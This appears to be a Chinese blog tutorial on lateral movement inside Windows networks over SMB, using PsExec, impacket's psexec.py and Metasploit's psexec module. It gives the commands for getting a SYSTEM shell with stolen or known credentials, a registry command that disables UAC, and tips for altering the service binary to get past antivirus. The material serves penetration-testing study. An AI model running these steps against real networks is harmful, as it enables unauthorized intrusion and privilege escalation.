# 原创
：  【内网安全-横向移动】基于SMB协议-PsExec

# 【内网安全-横向移动】基于SMB协议-PsExec

**目录**

[一、SMB协议](#%E4%B8%80%E3%80%81SMB%E5%8D%8F%E8%AE%AE)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、工具：](#2%E3%80%81%E5%B7%A5%E5%85%B7%EF%BC%9A)

[二、PsExec](#%E4%BA%8C%E3%80%81PsExec)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、使用：](#2%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A)

[1、常用参数：](#1%E3%80%81%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%EF%BC%9A)

[2、情况：](#2%E3%80%81%E6%83%85%E5%86%B5%EF%BC%9A)

[3、插件](#3%E3%80%81%E6%8F%92%E4%BB%B6)

[三、PsExec（impacket）](#%E4%B8%89%E3%80%81PsExec%EF%BC%88impacket%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[1、impacket：](#1%E3%80%81impacket%EF%BC%9A)

[2、PsExec-impacket](#2%E3%80%81PsExec-impacket)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、使用：](#2%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A)

[四、MSF](#%E5%9B%9B%E3%80%81MSF)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、使用：](#2%E3%80%81%E4%BD%BF%E7%94%A8%EF%BC%9A)

---


## 一、SMB协议

> 
<h3>1、简述：</h3>
1）SMB(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通
[【内网安全-隧道技术】SMB、ICMP、DNS隧道、SSH协议<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://blog.csdn.net/qq_53079406/article/details/128328429?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167590823616800192267225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167590823616800192267225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128328429-null-null.blog_rank_default&amp;utm_term=smb&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/128328429?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167590823616800192267225%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=167590823616800192267225&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-128328429-null-null.blog_rank_default&amp;utm_term=smb&amp;spm=1018.2226.3001.4450)
——————
2）判断：445端口
——————
3）IPC$连接：走的445端口，功能即实现文件共享
[【内网安全-横向移动】IPC$连接---＞计划任务---＞上线<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://blog.csdn.net/qq_53079406/article/details/128899133?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/128899133?spm=1001.2014.3001.5501)


> 
<h3>2、工具：</h3>
PsExec、impacket-smbexec、services等


---


---


## 二、PsExec

> 
<h3>1、简述：</h3>
1）PsExec：是一种轻量级 telnet-replacement，可用于在其他系统上执行进程，为控制台应用程序提供完全交互性，而无需手动安装客户端软件。
——————
2）（远程命令行工具）PsExec 最强大的用途包括对远程系统和远程启用工具（如 IpConfig）启动交互式命令提示符，否则无法显示有关远程系统的信息。
——————
3）注意：一些防病毒扫描程序报告一个或多个工具感染了“远程管理员”病毒。 PsTools 中没有含有病毒，但它们已被病毒使用，这就是为什么它们触发病毒通知的原因
——————
4）使用条件：
目标开启ipc$ (该共享默认开启，依赖445端口)，连接到admin$
ipc$连接需要账号密码（工作组：使用管理员、域环境：使用域用户/域管理员、域控：使用域管理员）
目标防火墙开发445端口（默认禁止连接）
杀软检测不出被病毒使用（微软自带的，在白名单里）
——————
5）官方文档：
[PsExec - Sysinternals | Microsoft Learn<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec](https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec)用法
<pre>`psexec [\\computer[,computer2[,...] | @file]][-u user [-p psswd][-n s][-r servicename][-h][-l][-s|-e][-x][-i [session]][-c executable [-f|-v]][-w directory][-d][-&lt;priority&gt;][-a n,n,...] cmd [arguments]`</pre>
文档中包含相关参数




> 
<h3>2、使用：</h3>
<h4>1、常用参数：</h4>
<pre><code>-u            用户名，如果在域内：域\用户名
-p            密码
-accepteula   第一次运行不弹出确认框
-s            system权限运行
-i            运行该程序，以便它与远程系统上指定会话的桌面进行交互。如果没有指定会话，进程将在控制台会话中运行
（-i cmd = cmd.exe）
（账号密码 = -hashes :$HASH$）</code></pre>
<hr/>
<h4>2、情况：</h4>
情况一：未建立IPC$的情况
<pre><code>1、建立连接，并以管理员运行cmd.exe
.\PsExec.exe -accepteula \\*.*.*.* -u administrator -p 密码 -s cmd.exe /c "命令如whoami"</code></pre>

——————
情况二：已经建立IPC$的情况
<pre><code>1、建立正常连接
net use \\192.168.*.*\ipc$ "密码" /user:"Administrator"     

2、已建立连接后
.\PsExec.exe -accepteula \\*.*.*.* -s cmd.exe /c "whoami"</code></pre>
<hr/>
<h4>3、插件</h4>
cs-psexec


#### 2、情况：

---


---


---


## 三、PsExec（impacket）

> 
<h3>1、简述：</h3>
<h4>1、impacket：</h4>
1）简述：Impack是一组用于处理网络协议的Python类的集合。Impack专注于提供对数据包的低级编程访问，并为某些协议（例如SMB1-3和MSRPC）提供协议实现本身。数据包可以从头开始构建，也可以从原始数据中解析，面向对象的API使处理协议的深层层次结构变得简单。该库提供了一组工具作为示例，说明可以在该库的上下文中完成什么
——————
2）项目地址：
exe版本：
[maaaaz/impacket-examples-windows: The great impacket example scripts compiled for Windows (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/maaaaz/impacket-examples-windows](https://github.com/maaaaz/impacket-examples-windows)——————
py版本：
[mirrors / SecureAuthCorp / impacket · GitCodeImpacket is a collection of Python classes for working with network protocols. 🚀 Github 镜像仓库 🚀 源项目地址 <img alt="" src="https://gitcode.net/uploads/-/system/appearance/favicon/1/icon.png"/>https://gitcode.net/mirrors/SecureAuthCorp/impacket?utm_source=csdn_github_accelerator](https://gitcode.net/mirrors/SecureAuthCorp/impacket?utm_source=csdn_github_accelerator)
<hr/>
3）UAC（User Account Control：用户账户控制）：（从Win7开始）Windows系统引入的一种新的安全机制，这是一种通知用户是否对应用程序使用硬盘和系统文件授权，从而防止恶意程序损坏系统的机制
[Windows) 用户帐户控制 ( | Microsoft Learn<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://learn.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-overview](https://learn.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-overview)界面操作：
Win10中关闭UAC方法：控制面板---&gt;用户账户---&gt;更改用户账户控制设置---&gt;对话框中设置合适的等级（最低：从不通知）
——————
命令操作：
<pre><code># 管理员运行cmd，输入以下命令（参数0为关闭，1为恢复默认）
C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
</code></pre>
<hr/>
4）RID：
RID=1000+：指派给用户、计算机和组
RID=500-999：保留起来、表示在每个Windows计算机和域中



---


> 
<h3>2、PsExec-impacket</h3>
<h4>1、简述：</h4>
1）相关参数
<pre><code>1、lget {file}                 #下载目标机器中的文件。
2、lput {src_file, dst_path}   #上传文件到目标机器。
3、-codec                      #解码命令执行的返回结果</code></pre>
——————
2）原理：通过smb上传一个服务程序到c:\windows（ADMIN$）目录，服务程序通过管道进行后续的命令执行的输入输出
——————
3）注：原版psexec.py上传会被拦截，需要绕过杀软（需要对服务程序修改尝试绕过杀软，如修改管道名称---&gt;重新生成RemComSvc---&gt;转成hex）
——————
4）命名：上传会随机英文字符串，使用PsExec.py提供的参数命名（防止名字容易被察觉异常）
<hr/>
<h4>2、使用：</h4>
1、工具的准备（impacket中，服务程序位于/impacket/examples/remcomsvc.py文件中（二进制数据），需要修改其中的二进制数据绕过杀软）
1、通过IPC$（smb协议）建立连接、上传服务程序到c:\windows（ADMIN$）目录（管理员权限，且防火墙端口开放）
2、打开管道，连接目标服务控制管理器SCM，创建、启动服务（serviceinstall.py进行服务安装），通过管道进行命令执行的输入输出，命令执行结束。
3、重新连接服务控制管理器，停止并删除服务、并删除服务程序



#### 2、使用：

---


---


## 四、MSF

> 
<h3>1、简述：</h3>
1）特点：安全漏洞检测工具、数千个软件漏洞（不断更新）
<hr/>
2）功能：信息收集、漏洞探测、漏洞利用等（即渗透测试的全流程）
<hr/>
3）GitHub：
[rapid7/metasploit-framework: Metasploit Framework (github.com)<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
<hr/>
4）下载最新版本：
[夜间安装程序|Metasploit文档渗透测试软件，渗透测试安全性<img alt="icon-default.png?t=N176" src="https://csdnimg.cn/release/blog_editor_html/release2.2.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N176"/>https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)



---


> 
<h3>2、使用：</h3>
1）搜索相关模块
<pre>`search psexec`</pre>
2）使用模块
<pre><code>use exploit/windows/smb/psexec
（或者use +序号）
</code></pre>
3）配置、运行
<pre><code>show options                #查看相关配置
set rhosts 192.168.*.*      #目标主机
set smbuser administrator   #用户名
set smbpass 111111          #密码

exploit                     #运行
（会出现meterpreter &gt;）</code></pre>
4）命令执行
<pre><code>输入shell
meterpreter &gt;shell
（获得system权限的shell，进行相关命令执行）</code></pre>



